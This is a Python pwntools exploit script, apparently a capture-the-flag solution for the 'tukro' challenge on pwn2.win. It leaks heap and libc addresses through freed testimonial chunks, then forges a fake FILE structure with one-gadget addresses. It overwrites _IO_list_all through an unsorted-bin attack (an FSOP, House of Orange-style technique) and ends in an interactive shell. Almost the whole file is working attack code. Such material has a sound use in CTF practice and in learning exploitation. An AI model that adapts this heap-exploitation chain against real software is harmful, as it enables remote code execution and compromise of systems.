from pwn import *
context.arch = 'amd64'

TARGET = './tukro'
HOST = 'tukro.pwn2.win'
PORT = 1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


def signup(name, pw): 
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('Username: ', name)
    r.sendlineafter('Password: ', pw)

def signin(name, pw): 
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('Username: ', name)
    r.sendlineafter('Password: ', pw)

def write(name, text):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter(' Username: ', name)
    r.sendafter('Testimonial: ', text)

def view_rx():
    r.sendlineafter('choice: ', '2')

def view_tx_edit(idx=0, text=''):
    r.sendlineafter('choice: ', '3')
    if idx != 0:
        ret = r.sendlineafter('): ', 'y')
        r.sendlineafter('Number: ', str(idx))
        r.sendafter('New Testimonial: ', text)
    else:
        ret = r.sendlineafter('): ', 'N')
    return ret

def delete(idx):
    r.sendlineafter('choice: ', '4')
    r.sendlineafter('Number: ', str(idx))

def signout():
    r.sendlineafter('choice: ', '5')

r = start()
signup('A'*8, 'A'*8)
signup('B'*8, 'A'*8)
signup('C'*8, 'A'*8)
signup('D'*8, 'A'*8)

signin('A'*8, 'A'*8)

for i in range(10):
   write('B'*8, str(i)*0x500)

signout()
signin('B'*8, 'A'*8)
delete(1)
delete(2)
delete(3)

signout()
signin('A'*8, 'A'*8)
text = view_tx_edit()

leak = u64(text.split('Testimonial 8: \n')[1][:6] + '\x00'*2)
dbg("leak")
heap = leak - 0xa20
dbg("heap")

leak = u64(text.split('Testimonial 10: \n')[1][:6] + '\x00'*2)
dbg("leak")
base = leak - 0x3c4b78
dbg("base")

system = base + 0x45390
binsh = base + 0x18cd57
target = base + 0x3c4b78
fh = base + 0x3c67a8
mh = base + 0x3c4b10


gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
io_list_all = base + 0x3c5520
lock = base + 0x3c6780

payload = ''
payload += flat(target , heap+0x100)
payload += 'E'* 0xe0
payload += flat(0, 0x61)
payload += flat(heap, heap + 0xa20)
payload += flat(0x10, 0x100)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0xffffffff, 0)
payload += flat(heap+0x1e0, heap+0x1e0)
payload += p64(base+gadget[3])*0x10

view_tx_edit(10, payload)
write('C'*8, '1234'*0x2)
write('C'*8, '1234'*0x2)

view_tx_edit(8, flat(target, io_list_all-0x10)) 

write('C'*8, 'X'*0x8)
if args.D:
    debug(r, [0x126f])

context.log_level = 'debug'
write('C'*8, '')
r.interactive()
r.close()
